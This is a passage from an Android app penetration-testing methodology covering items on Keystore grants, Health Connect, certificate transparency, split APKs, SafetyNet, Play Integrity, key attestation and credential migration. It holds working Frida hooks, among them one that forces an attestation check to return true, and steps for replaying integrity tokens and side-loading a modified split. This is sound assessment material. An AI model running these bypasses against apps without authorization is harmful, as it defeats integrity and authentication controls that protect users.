- **Test:** Android 16 added an API to share Android Keystore keys with other apps by UID. Any grant
  widens the key's trust boundary; a grant to a UID the app does not control, or a grant that is never
  revoked, is the finding. This API is new enough that essentially no public checklist covers it — grep
  for it on every Android-16-targeting app.
- **How:**
  ```bash
  grep -rnE 'KeyStoreManager|grantKeyAccess|revokeKeyAccess' out/sources/
  ```
  ```javascript
  Java.perform(function () {
    var KSM = Java.use('android.security.keystore.KeyStoreManager');
    KSM.grantKeyAccess.overload('java.lang.String','int').implementation = function (alias, uid) {
      console.log('[keygrant] alias=' + alias + ' uid=' + uid);
      return this.grantKeyAccess(alias, uid);
    };
  });
  ```
  ```bash
  adb shell dumpsys package | grep -B4 "userId=<uid>"      # resolve the uid to a package
  ```
- **Proof:** Hook output showing a signing or encryption alias granted to a third-party package's UID,
  with no matching `revokeKeyAccess` on teardown, plus the identity of the grantee resolved from
  `dumpsys package`.
- **Escalation:** -> D12 key management; -> D13 authentication forgery, because the grantee can produce
  valid signatures indefinitely.
- **Ruled out when:** No reference to `KeyStoreManager` in the app (record the grep count), or every
  `grantKeyAccess` is paired with a `revokeKeyAccess` in the same lifecycle and targets a UID inside the
  app's own signing family (resolve it and say so).

### D22-059 · Health Connect granular permissions replace `BODY_SENSORS` at targetSdk 36

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — Critical framing when reproductive or mental-health records leave the device |
| **Attacker** | AM-05 / AM-09 |
| **Applies to** | apps integrating Health Connect; Android 14+ ships it as a platform component; at targetSdk 36 the granular `android.permission.health.*` permissions **replace** `BODY_SENSORS`, and `READ_HEALTH_DATA_IN_BACKGROUND` replaces `BODY_SENSORS_BACKGROUND` |
| **Maps to** | `health-and-fitness/guides/health-connect/plan/data-types` (the `android.permission.health.*` family including `READ_MENSTRUATION`, `READ_SEXUAL_ACTIVITY`, `READ_MINDFULNESS`); `health-and-fitness/guides/health-connect` (`HealthConnectClient`, `READ_HEALTH_DATA_IN_BACKGROUND`, `READ_HEALTH_DATA_HISTORY`, the required privacy-policy activity carrying `android.intent.action.VIEW_PERMISSION_USAGE`); `about/versions/16/behavior-changes-16` (`android.permission.health.READ_HEART_RATE` and friends replacing `BODY_SENSORS`; affects `HEART_RATE_BPM`, `Sensor.TYPE_HEART_RATE`, `FOREGROUND_SERVICE_TYPE_HEALTH`) |

- **Test:** Two halves. First, audit the declared `android.permission.health.*` set against what the app
  functionally needs — this is the most sensitive permission family in Android and it carries two force
  multipliers, `READ_HEALTH_DATA_IN_BACKGROUND` and `READ_HEALTH_DATA_HISTORY`. Second, the Android 16
  migration: apps that kept `BODY_SENSORS` at targetSdk 36 usually added a silent fallback (raw
  `Sensor.TYPE_HEART_RATE`, or a vendor SDK) that reads biometrics **outside** the permission surface the
  user was shown.
- **How:**
  ```bash
  grep -n 'android.permission.health' out/AndroidManifest.merged.xml | sort
  grep -nE 'BODY_SENSORS|BODY_SENSORS_BACKGROUND' out/AndroidManifest.merged.xml
  grep -n 'VIEW_PERMISSION_USAGE\|ACTION_SHOW_PERMISSIONS_RATIONALE\|ViewPermissionUsageActivity' out/AndroidManifest.merged.xml
  grep -rnE 'HealthConnectClient|readRecords|aggregate\(|TYPE_HEART_RATE|HEART_RATE_BPM|FOREGROUND_SERVICE_TYPE_HEALTH' out/sources/
  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p' | grep health
  ```
- **Proof:** A declared `android.permission.health.READ_SEXUAL_ACTIVITY` (or another category the app has
  no feature for) plus `READ_HEALTH_DATA_IN_BACKGROUND`, with the corresponding record type appearing in
  a network request body — or a `BODY_SENSORS`-era path still reading heart rate at targetSdk 36,
  bypassing the user's Health Connect decision.
- **Escalation:** -> D20 data-safety mismatch; -> D15 if the backend stores it without encryption or
  exposes it through an IDOR.
- **Ruled out when:** Every declared health permission maps to a visible feature (list the pairs), the
  rationale activity is a real disclosure screen rather than a stub, and no non-Health-Connect biometric
  read path exists (grep counts for `TYPE_HEART_RATE` and vendor SDKs zero).

### D22-060 · Certificate Transparency: opt-in at Android 16, default at API 37 — and the custom-trust-anchor caveat

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` (P5) standalone; report through the MitM outcome |
| **Attacker** | AM-06 with a mis-issued certificate |
| **Applies to** | `<certificateTransparency>` available from Android 16 (API 36), disabled by default; enabled by default at API 37+; not available at API 35 and lower |
| **Maps to** | `privacy-and-security/security-config` (`<certificateTransparency enabled="true\|false"/>`, API 36 opt-in and API 37+ default-on; "Certificate transparency verification is NOT performed on connections using custom trust anchors"; `<certificates src>` values `system`/`user`/raw resource; `overridePins` default false except inside `<debug-overrides>` where it is true); MASTG-TEST-0242 |

- **Test:** Two things. A `domain-config` that sets `<certificateTransparency enabled="false"/>` on a
  sensitive domain is a deliberate removal of CT enforcement on the one connection that matters. And —
  the part testers miss — CT verification is **not performed at all** on connections using custom trust
  anchors, so an app that pins by embedding its own CA as `<certificates src="@raw/my_ca"/>` gets no CT
  either way, and a compromise of that CA is undetectable.
- **How:**
  ```bash
  grep -n 'networkSecurityConfig' out/AndroidManifest.merged.xml
  cat out/res/xml/network_security_config.xml 2>/dev/null
  grep -nE 'certificateTransparency|<certificates src=|overridePins|<debug-overrides>|<pin-set|domainEncryption' out/res/xml/*.xml
  ```
- **Proof:** `<certificateTransparency enabled="false"/>` on the API domain, or a custom trust anchor for
  the API domain (which silently disables CT), combined with the absence of any `<pin-set>` — quote the
  config block.
- **Escalation:** -> D14 for the MitM; a `<debug-overrides>` block or `overridePins="true"` in
  `base-config` shipped in a release build is the stronger sibling finding and belongs there too.
- **Ruled out when:** The network security config contains a `<pin-set>` for the API domain with a
  non-expired backup pin, **or** `<certificateTransparency enabled="true"/>` with `system` trust anchors
  only. Paste the config.

### D22-061 · ART and Mainline module updates changing behaviour under a shipped app

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | none directly — rate on the security control that changes behaviour |
| **Attacker** | AM-01 (no actor; a Google Play system update) |
| **Applies to** | Android 12+ for ART as an APEX; non-SDK restrictions from Android 9 |
| **Maps to** | `about/versions/16/behavior-changes-all` (apps relying on internal ART structures or non-SDK interfaces may break on Android 16 and on earlier versions receiving ART updates through Google Play system updates); AOSP ART module `com.android.art`; the Conscrypt APEX (D22-035) is the same mechanism applied to trust |

- **Test:** ART, Conscrypt and several other modules now update through Google Play system updates,
  independently of the OS release. A security control built on a non-SDK interface, on internal ART
  structures, or on a fixed trust-store path can therefore change behaviour — or fail open — on a device
  that never took an OS upgrade. This is also why a PoC can stop reproducing mid-engagement without
  anyone patching the app (see D22-080).
- **How:**
  ```bash
  adb shell ls /apex | sort
  adb shell dumpsys package com.android.art | grep -iE 'versionName|versionCode'
  adb shell dumpsys package com.android.conscrypt | grep -iE 'versionName|versionCode'
  grep -rnE 'setAccessible\(true\)|getDeclaredMethod\(|Class\.forName\("(android|dalvik|libcore)\.|VMRuntime|VMDebug|hiddenapi|Unsafe' out/sources/
  adb logcat | grep -iE 'Accessing hidden (method|field)|greylist|blacklist|max-target'
  ```
- **Proof:** `Accessing hidden method L…` warnings from the app's UID paired with the code path that
  depends on them, plus the APEX version recorded in the evidence baseline so the result is reproducible.
- **Escalation:** -> D21 where the affected control is a pinning implementation, a RASP check or a
  secure-storage wrapper; -> D22-080 for the reporting consequence.
- **Ruled out when:** No reflection against platform internals (grep count zero) and the app's security
  controls use public APIs only. Record the module versions in the baseline regardless — it is what makes
  the rest of the report reproducible.

### D22-062 · The API 37 horizon — changes already landing that will invalidate current PoCs

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — forward-looking applicability |
| **Attacker** | n/a |
| **Applies to** | preview/QPR builds and apps targeting API 37; state it as forward-looking, never as a current finding |
| **Maps to** | `privacy-and-security/security-config` (`<domainEncryption>` Encrypted Client Hello, API 37+; `<certificateTransparency>` default-on at API 37+); the compat change `ENFORCE_STRICT_SQL_CHECKS` (id `484953293`, Android 17, applying only to callers with targetSdk >= 37); the read-only mandate extended to `System.load()` native libraries at targetSdk 37; `PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY` documented as not applying at API 37+ |

- **Test:** Three changes on the near horizon each close a class this chapter currently treats as live,
  and one opens a new question. Record which of them the client's next target bump will hit, so a finding
  you file today is not closed as "already fixed in our next release".
- **How:**
  ```bash
  # provider strict SQL — the compat pair that proves the change is the control:
  adb shell am compat enable  484953293 com.target.app    # patched behaviour
  adb shell am compat disable 484953293 com.target.app    # current behaviour
  # native library read-only mandate (targetSdk 37):
  grep -rnE 'System\.load\(|System\.loadLibrary\(' out/sources/
  adb shell run-as com.target.app ls -l files/*.so lib/ 2>/dev/null
  # ECH and CT defaults:
  grep -nE 'domainEncryption|certificateTransparency' out/res/xml/*.xml
  ```
- **Proof:** For the provider case, the paired run producing data on one side and
  `IllegalArgumentException: Invalid token SELECT` on the other. For the rest, the grep results recorded
  against the client's stated next target level.
- **Escalation:** -> D07 provider SQL; -> D17 native code delivery; -> D14 for ECH and CT.
- **Ruled out when:** The client's roadmap does not include a targetSdk 37 bump in the reporting window,
  which you state. This item never produces a finding on its own.

### D22-063 · App Bundle split delivery — the code that is not in `base.apk`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) when a split exports a component; rated on what the unreviewed code does |
| **Attacker** | AM-03 |
| **Applies to** | apps distributed as app bundles with `dynamicFeatures` |
| **Maps to** | `guide/app-bundle/play-feature-delivery` (`android:isFeatureSplit`, `dist:module`, `dist:delivery`, `dist:removable`, `SplitInstallManager`, `SplitCompatApplication`; the doc's own warning that "Feature modules should not export activities unless guaranteed to be installed"; "App bundles are signed using signing configs from the base module only"; "Split APKs are verified by the Play Store before delivery") |

- **Test:** Play Feature Delivery ships `com.android.dynamic-feature` modules as separate split APKs
  after install. A reviewer who decompiles only `base.apk` misses whole activities, receivers, services
  and native libraries — and so, very often, does the vendor's own SAST. Pull every split from the device
  and treat each as a first-class manifest.
- **How:**
  ```bash
  adb shell pm path com.target.app
  #   package:/data/app/.../base.apk
  #   package:/data/app/.../split_feature_payments.apk
  for p in $(adb shell pm path com.target.app | sed 's/package://' | tr -d '\r'); do adb pull "$p" .; done
  ls -1 *.apk | wc -l                          # count — compare with the pm path line count
  for f in split_*.apk; do echo "== $f"; aapt2 dump badging "$f" | head -5; done
  for f in base.apk split_*.apk; do jadx -d "out_${f%.apk}" "$f" >/dev/null 2>&1; done
  grep -rn 'android:exported="true"' out_split_*/resources/AndroidManifest.xml 2>/dev/null
  grep -rn 'isFeatureSplit\|dist:module\|dist:delivery' out_split_*/resources/AndroidManifest.xml 2>/dev/null
  ```
- **Proof:** An `<activity android:exported="true">` (or a service, receiver or provider) present in a
  split manifest and absent from `base.apk`, reachable with `am start -n` once the split is installed.
- **Escalation:** -> D01 inventory (the split components join the component census); -> D04/D06/D07 by
  type; -> D17 for the loading integrity.
- **Ruled out when:** `pm path` returns only `base.apk` and `split_config.*` configuration splits (ABI,
  density, language), with no feature splits — record the full `pm path` output, which is the mechanism.

### D22-064 · Base-only install — does the app fail closed when the integrity split is missing?

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the missing split held the auth or licensing gate; otherwise rated on the removed control |
| **Attacker** | AM-11 (sideload) / AM-12 |
| **Applies to** | apps shipped as AAB with dynamic features |
| **Maps to** | `guide/app-bundle/play-feature-delivery` ("Apps must verify module installation before accessing code/resources via `SplitInstallManager.getInstalledModules()`"; `android:isSplitRequired`) |

- **Test:** Bundled apps normally refuse to run without their required splits. Test whether this one
  degrades **open** rather than failing closed when a split is absent — particularly when that split is
  the one holding the attestation, licensing or RASP code. This removes the control by omission, without
  touching `base.apk`'s signature.
- **How:**
  ```bash
  adb uninstall com.target.app
  adb install base.apk                              # base only, no splits
  adb logcat -c; adb shell monkey -p com.target.app 1
  adb logcat -d | grep -iE 'split|SplitCompat|missing|getInstalledModules'
  # compare with the full session install:
  adb install-multiple base.apk split_*.apk
  # and try supplying a modified split out-of-band:
  adb install-multiple base.apk attacker_split.apk
  adb shell pm install-create -p com.target.app
  adb logcat -d | grep -iE 'INSTALL_FAILED|signature|split'
  ```
- **Proof:** Either the app launching base-only with a feature gated by
  `SplitInstallManager.getInstalledModules()` reachable anyway (the module check returns false and the
  code path proceeds), or the installer refusing the modified split with an exact failure string (which
  is the negative result, and worth recording). A successful side-load of a modified split is reported
  immediately with the full install-session transcript.
- **Escalation:** -> D21 attestation/RASP removal without repacking; -> D17 supply chain.
- **Ruled out when:** The base-only install refuses to launch, or launches and every split-gated feature
  is unreachable (walk each one). Record the logcat and the feature list.

### D22-065 · SafetyNet Attestation still called — dead since January 2025

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the dead gate was the only control on an authenticated or paid action; otherwise rated on what it protected |
| **Attacker** | AM-12 initially, but the gate is open for **every** device unconditionally |
| **Applies to** | any app still shipping the SafetyNet dependency — still common in older enterprise and white-label builds |
| **Maps to** | `privacy-and-security/safetynet/deprecation-timeline` (deprecated 2022; full turndown January 2025; "The attest API returns a task that always invokes the on failure listener with an ApiException"; status code 7 `NETWORK_ERROR`; migrate to the Play Integrity API) |

- **Test:** SafetyNet Attestation was fully turned down in January 2025. The `attest` API now always
  invokes the failure listener with an `ApiException` carrying status code 7. An app that still calls it
  and treats a failure as "network problem, allow" has a permanently open integrity gate, on every
  device, today, in production. This is the cheapest High in the chapter.
- **How:**
  ```bash
  unzip -l base.apk | grep -i safetynet
  grep -rnE 'SafetyNet|SafetyNetClient|SafetyNetApi|attest\(' out/sources/ -A10 | grep -inE 'addOnFailureListener|catch|allow|proceed|return true'
  ```
  ```javascript
  Java.perform(function () {
    var L = Java.use('com.google.android.gms.tasks.OnFailureListener');
    // or hook the app's own failure handler directly and log which branch follows
  });
  ```
- **Proof:** The failure branch reached on every launch (Frida log on the failure listener or the app's
  handler), with the app proceeding as if attested — then the protected action completing on a device
  that would never have passed attestation.
- **Escalation:** -> D21 RASP; -> D23 where the gate protected an entitlement or a payment.
- **Ruled out when:** No SafetyNet class in the APK (`unzip -l | grep -i safetynet` empty), or the
  failure branch denies the protected action (show the denial). A migration to Play Integrity moves you
  to D22-066.

### D22-066 · Play Integrity verdict consumed client-side, or without the four baseline checks

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the integrity gate was the auth control; `broken_access_control.privilege_escalation` (null) for the abuse-control bypass |
| **Attacker** | AM-12 for the on-device decryption case; AM-03 for the relay case |
| **Applies to** | apps using the Play Integrity API (Standard requests need Android 6.0 / API 23+ at library v1.4.0+) |
| **Maps to** | `google/play/integrity/overview` (verdict fields `requestDetails`, `appIntegrity.appRecognitionVerdict` = `PLAY_RECOGNIZED`, `deviceIntegrity` labels `MEETS_BASIC_INTEGRITY`/`MEETS_DEVICE_INTEGRITY`/`MEETS_STRONG_INTEGRITY`, `accountDetails.appLicensingVerdict` = `LICENSED`, `environmentDetails` opt-ins `appAccessRiskVerdict`/`playProtectVerdict`/`recentDeviceActivity`/`deviceRecall`; `requestHash` for standard requests and `nonce` for classic; "No caching: Request verdicts on-demand to prevent replay/proxying attacks"; the warning that data in `nonce`/`requestHash` is visible in cleartext to the app and to Google) |

- **Test:** The documented server-side baseline is four checks in order: `requestDetails` match the
  expected values; `requestHash` (standard) or `nonce` (classic) prevents replay;
  `appIntegrity.appRecognitionVerdict == PLAY_RECOGNIZED`; `accountDetails.appLicensingVerdict ==
  LICENSED` — and only then evaluate `deviceIntegrity`. Test each omission, and separately test whether
  the decision is made on the device at all.
- **How:**
  ```bash
  grep -rnE 'IntegrityManager|StandardIntegrityManager|requestIntegrityToken|integrityToken|decodeIntegrityToken|IntegrityTokenResponse|setNonce\(|setRequestHash\(' out/sources/ -B4 -A8
  ```
  Then, against the live flow in Burp:
  1. Replay a previously captured token against a second, different request -> tests `requestHash`/`nonce`
     binding. Capture two requests with different bodies and compare the hash; if identical, binding is
     absent.
  2. Strip the integrity header entirely -> tests whether it is enforced or advisory. **Compare response
     bodies byte for byte**, not status codes: an identical 200 both ways means the header was never
     checked, which is the finding; a 200 that differs only in a correlation id is not a bypass.
  3. Obtain a token on a clean device and relay it with a modified request body from an instrumented
     device -> tests content binding.
  4. Decode the token client-side; if the app parses verdict fields locally rather than forwarding an
     opaque token, the decision is on the attacker's device.
  ```bash
  echo "$NONCE" | base64 -d | strings | head     # check for PII placed in the nonce
  ```
- **Proof:** The same token accepted twice for different operations, or the API succeeding with the token
  header removed and a byte-identical response body, or a local branch on `deviceIntegrity` contents that
  a one-line hook flips. Each captured as a request/response pair.
- **Escalation:** -> D21 RASP; -> D23 where the bypassed control gated referral credit, free premium or
  scraping limits; -> D20 if the nonce carried an email or a bearer token to Google.
- **Ruled out when:** The token is opaque on the wire, a replayed token is rejected, the `requestHash`
  differs between two different request bodies, and stripping the header returns a different response
  body. Show all four pairs.

### D22-067 · Key attestation verified on-device, or accepted without CRL, security level and expiry checks

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where attestation gates authentication; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (null) for the verifier defects |
| **Attacker** | AM-12 for the on-device case; AM-03 for a forged or stale chain submitted to the backend |
| **Applies to** | all apps using key attestation; device-side behaviour differs on Android 15 (RKP optional) versus Android 16 (RKP only, factory keys phased out) |
| **Maps to** | `privacy-and-security/security-key-attestation` ("Perform verification on a separate, trusted server (not on the compromised device)"; the requirement list — root signed with the Google attestation root key, `attestationSecurityLevel` of `TrustedEnvironment` or `StrongBox`, all signatures verified, no certificate in the CRL; CRL at `https://android.googleapis.com/attestation/status` with `status` values `REVOKED`/`SUSPENDED` and `reason` values `UNSPECIFIED`/`KEY_COMPROMISE`/`CA_COMPROMISE`/`SUPERSEDED`/`SOFTWARE_FLAW`; root list at `https://android.googleapis.com/attestation/root`; `attestationSecurityLevel` values `SOFTWARE`/`TRUSTED_ENVIRONMENT`/`STRONGBOX`; `verifiedBootState`, `deviceLocked`, `attestationChallenge`; "Don't assume the key attestation extension is in the leaf certificate. Only the first occurrence of the extension can be trusted"; a new EC-based root signing attestation chains from 1 February 2026 alongside the existing root `SERIALNUMBER=f92009e853b6b045` valid 2022-03-20 to 2042-03-15; "Android 15+: RKP support is optional. Android 16+: Only RKP is supported"; RKP certificates have deliberately short validity and "the shorter expiration is part of the threat model"; the official verifier library at `github.com/android/keyattestation`) |

- **Test:** The whole premise of attestation is that the device may be compromised, so verification
  performed **in the app** is decorative. On the server side, the recurring defects are: skipping the
  revocation list; accepting `attestationSecurityLevel = SOFTWARE`; trusting the extension from the wrong
  certificate in the chain; hardcoding the old root; and skipping validity checks on short-lived RKP
  certificates.
- **How:**
  ```bash
  grep -rnE 'setAttestationChallenge|getCertificateChain|attestationSecurityLevel|1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' out/sources/
  ```
  If the chain never leaves the device (no matching outbound request in Burp carrying the certificates),
  the check is local — prove the bypass:
  ```javascript
  Java.perform(function () {
    var V = Java.use('com.target.app.security.AttestationVerifier');
    V.isDeviceTrustworthy.implementation = function () { return true; };
  });
  ```
  Server-side tests:
  ```bash
  curl -s https://android.googleapis.com/attestation/status | jq '.entries | keys | length'
  curl -s https://android.googleapis.com/attestation/root -o roots.pem
  openssl x509 -in leaf.pem -text -noout | grep -A20 '1.3.6.1.4.1.11129.2.1.17'
  openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text -noout | grep -E 'Not After|Serial'
  ```
- **Proof:** Attestation-gated functionality unlocked on a rooted or emulated device after a one-line
  hook; or the backend returning "attested/trusted" for a chain whose leaf claims `SOFTWARE`, carries a
  serial present in the CRL, or has expired.
- **Escalation:** -> D21 full RASP bypass; -> D15 for whatever the attestation gated; -> D12 for the key
  material.
- **Ruled out when:** The certificate chain appears in an outbound request (show it in Burp), the backend
  rejects a `SOFTWARE`-level chain, rejects a revoked serial and rejects an expired RKP leaf. Show the
  four rejections.

### D22-068 · Credential Manager adopted with the legacy sign-in path left in place

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the downgrade completes a sign-in the passkey path would refuse; `broken_authentication_and_session_management.two_fa_bypass` (P3) for the factor-downgrade framing |
| **Attacker** | AM-02 (phishing origin) / AM-03 |
| **Applies to** | apps mid-migration to Credential Manager — very common through 2025-2026 |
| **Maps to** | `identity/sign-in/credential-manager` (migration guides from Google Sign-In, Smart Lock and FIDO2; `CredentialManager`, `GetCredentialRequest`, `CreatePublicKeyCredentialRequest`, `GetPublicKeyCredentialOption`, `GetPasswordOption`, `PasswordCredential`, `allowedProviders`, `setPreferImmediatelyAvailableCredentials`; integration with the Restore Credentials API) |

- **Test:** Apps migrating to Credential Manager and passkeys almost always keep the legacy path — Smart
  Lock, the FIDO2 API, Google Sign-In — as a fallback. The passkey path is phishing-resistant because it
  binds to an origin; the fallback usually is not. Force the fallback and see what it accepts. Also check
  the origin binding itself: for a passkey to be usable by this app, the site must publish an
  `assetlinks.json` naming the app's signing certificate, and a WebView-hosted Credential Manager call
  makes origin verification the entire control.
- **How:**
  ```bash
  grep -rn 'androidx.credentials\|CredentialManager\|GetCredentialRequest\|CreatePublicKeyCredentialRequest' out/sources/ | head
  grep -rnE 'Fido2ApiClient|CredentialsApi|GoogleSignInClient|SmartLock|allowedProviders|setPreferImmediatelyAvailableCredentials' out/sources/
  grep -rnE 'RestoreCredential|restore_credential' out/sources/ -i
  # the origin binding:
  grep -nE 'android:host|autoVerify' out/AndroidManifest.merged.xml
  curl -s https://<host>/.well-known/assetlinks.json | jq '.[].target'
  adb shell pm get-app-links com.target.app
  ```
  Force the fallback with a hook that throws from the Credential Manager call, then complete the legacy
  flow and observe what it verifies.
- **Proof:** The legacy path completing a sign-in with a credential the passkey path would have refused —
  wrong origin, no user verification — and the resulting session cookie or token working against the API.
- **Escalation:** -> D13 authentication chapter; -> D09 for the App Link / `assetlinks.json` origin
  binding; account takeover is the impact.
- **Ruled out when:** No legacy sign-in client remains in the APK (grep counts zero for `Fido2ApiClient`,
  `CredentialsApi`, `GoogleSignInClient`), or the fallback performs the same origin and
  user-verification checks (demonstrate the refusal). `pm get-app-links` reporting `verified` for every
  declared host closes the origin half.

### D22-069 · Restore Credentials and cross-device credential transfer

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where a session is re-established on a new device with no user verification |
| **Attacker** | AM-11 (restoring the victim's backup onto a device they control) |
| **Applies to** | apps adopting Restore Credentials; ties directly to the D2D transfer surface in D22-014 |
| **Maps to** | `identity/sign-in/credential-manager` ("Integration with Restore Credentials API for seamless sign-in on new devices") |

- **Test:** Credential Manager integrates with a Restore Credentials mechanism for "seamless sign-in on
  a new device". Any flow that re-establishes an authenticated session on a **different** device without
  a fresh user-verification step is worth probing: what binds the restored credential to the user rather
  than to the backup?
- **How:**
  ```bash
  grep -rni 'restorecredential\|RestoreCredential\|restore_credential\|createRestoreCredential' out/sources/
  ```
  Perform a device-to-device restore into a second device or emulator, launch the app, and see where it
  lands.
- **Proof:** An authenticated session present on a freshly restored device with no biometric or PIN step
  — screenshotted in the five-state pattern, and confirmed by making an authenticated API call from that
  device.
- **Escalation:** -> D22-014 for the backup/transfer surface that carries the material; -> D11; -> D13
  account takeover.
- **Ruled out when:** The restored install lands on a re-authentication screen and no API call succeeds
  until it is completed (show the 401). Record both.

### D22-070 · LEGACY-live: targetSdk < 31 — components with an intent-filter exported without anyone typing it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **targetSdk <= 30 only.** At targetSdk 31+ the attribute is mandatory and the app fails to install without it (`INSTALL_FAILED_VERIFICATION_FAILURE`) — see D22-011 for the modern form |
| **Maps to** | MASTG-TECH-0160/0161/0162, MASTG-KNOW-0132/0133/0134; the Android 12 "Safer component exporting" change |

- **Test:** Below targetSdk 31, any component carrying an `<intent-filter>` is exported by default with
  no attribute present. The decoded manifest looks clean; the resolver tables disagree. This is the
  single most common stale-checklist item, and it is **only** live when D22-001 recorded a target of 30
  or lower.
- **How:**
  ```bash
  T=$(aapt2 dump badging base.apk | grep -oE "targetSdkVersion:'[0-9]+'" | grep -oE '[0-9]+'); echo "targetSdk=$T"
  [ "$T" -le 30 ] || echo "NOT APPLICABLE — do not report"
  grep -c '<intent-filter' out/AndroidManifest.merged.xml
  grep -c 'android:exported' out/AndroidManifest.merged.xml      # a shortfall is the implicit-export set
  # ground truth regardless of the manifest text:
  adb shell dumpsys package com.target.app | sed -n '/Activity Resolver Table/,/Permissions:/p'
  adb shell am start -n com.target.app/.NoExportedAttributeActivity
  ```
- **Proof:** The component listed in `dumpsys package`'s resolver tables despite carrying no
  `android:exported="true"` in the manifest, plus a successful launch from the shell UID.
- **Escalation:** -> D04/D05/D06 by component type.
- **Ruled out when:** `targetSdk >= 31`. That single integer closes the class, and it is the mechanism —
  quote it. On targetSdk <= 30, ruled out per component only by an `android:permission` at `signature`
  level or a demonstrated inert response.

### D22-071 · LEGACY-live: targetSdk < 17 — ContentProviders exported by default

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.sql_injection` (P1) for a provider with a raw query path; `server_side_injection.file_inclusion.local` (P1) via `openFile`; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **targetSdk <= 16 only.** Deep LEGACY; `android:exported` defaults to `false` from API 17 when no `<intent-filter>` is present |
| **Maps to** | MASTG-TECH-0163 (Enumerating Content Providers), MASTG-KNOW-0117; `guide/topics/manifest/provider-element` (the API 17 default change) |

- **Test:** On targetSdk <= 16 a `<provider>` with no `android:exported` is exported. On any modern
  target an exported provider is an explicit decision, so the *default-driven* form of this finding is
  dead and reporting it is a credibility cost.
- **How:**
  ```bash
  T=$(aapt2 dump badging base.apk | grep -oE "targetSdkVersion:'[0-9]+'" | grep -oE '[0-9]+')
  [ "$T" -le 16 ] || echo "NOT APPLICABLE — do not report the default-driven form"
  grep -nB2 -A8 '<provider' out/AndroidManifest.merged.xml
  adb shell content query --uri content://<authority>/ 2>&1 | head -5
  ```
- **Proof:** `content query` from the shell UID returning rows against a provider with no
  `android:exported` attribute and no `android:permission`.
- **Escalation:** -> D07 providers chapter, which owns the SQLi, traversal and `openFile` work.
- **Ruled out when:** `targetSdk >= 17`. Quote the integer. On a modern target, an exported provider is
  still testable — but it is D07's explicit-export item, not this one.

### D22-072 · LEGACY-live: minSdk < 24 — user-added CAs trusted by default

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` (P5) standalone; rate on what the intercepted traffic carries |
| **Attacker** | AM-06 (a real network attacker still needs a trusted CA; a user-installed CA is an AM-07 tester convenience and must not be presented as an attack) |
| **Applies to** | **targetSdk/minSdk < 24 only**, or at any level where the network security config explicitly includes `<certificates src="user"/>` — which is common in debug configs shipped to production |
| **Maps to** | MASTG-TEST-0285 (Outdated Android Version Allowing Trust in User-Provided CAs), MASTG-KNOW-0014; `privacy-and-security/security-config` (`<certificates src="user"/>`); ATT&CK T1632 |

- **Test:** Below API 24 an app trusts the user CA store with no configuration at all, so pushing a CA
  through Settings intercepts everything with no root. Above it, the *interesting* finding is not the
  default — it is an explicit `src="user"` opt-in, or a `<debug-overrides>` block, shipped in release.
- **How:**
  ```bash
  aapt2 dump badging base.apk | grep -E "sdkVersion:|targetSdkVersion:"
  grep -n 'networkSecurityConfig' out/AndroidManifest.merged.xml
  cat out/res/xml/network_security_config.xml 2>/dev/null
  grep -nE '<certificates src="user"|<debug-overrides>|overridePins' out/res/xml/*.xml
  adb shell ls /data/misc/user/0/cacerts-added
  ```
- **Proof:** For the LEGACY form, full plaintext in Burp on a stock unrooted device with only a user CA
  installed, plus the `sdkVersion` line. For the modern form, the `<certificates src="user"/>` element
  quoted from the release build's config.
- **Escalation:** -> D14 for the pinning posture; -> D15 for what the readable traffic carries. The
  interception itself is P5 and must never be filed alone.
- **Ruled out when:** `minSdk >= 24` **and** the network security config contains no `src="user"` and no
  `<debug-overrides>`. Paste the config file (or record its absence, which means the API 24+ default
  applies).

### D22-073 · LEGACY-live: targetSdk < 28 — cleartext HTTP permitted by default

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.cleartext_transmission_of_session_token` (P4) when a session token traverses it; rated on the data otherwise |
| **Attacker** | AM-06 |
| **Applies to** | **targetSdk <= 27** for the default; at 28+ the finding is that the app **re-enabled** it with `android:usesCleartextTraffic="true"` or a `cleartextTrafficPermitted="true"` domain config |
| **Maps to** | MASTG-TEST-0235 (Android App Configurations Allowing Cleartext Traffic), MASTG-KNOW-0014; the `android:usesCleartextTraffic` default flip at API 28; ATT&CK T1638, T1639.001 |

- **Test:** Below targetSdk 28, cleartext is permitted with no manifest entry at all. At 28+ the correct
  framing is always "the app re-enabled something", which is a stronger report than "the platform default
  is weak" — and it names the domain the developer chose to exempt.
- **How:**
  ```bash
  grep -nE 'usesCleartextTraffic|networkSecurityConfig' out/AndroidManifest.merged.xml
  grep -nE 'cleartextTrafficPermitted|<domain ' out/res/xml/network_security_config.xml 2>/dev/null
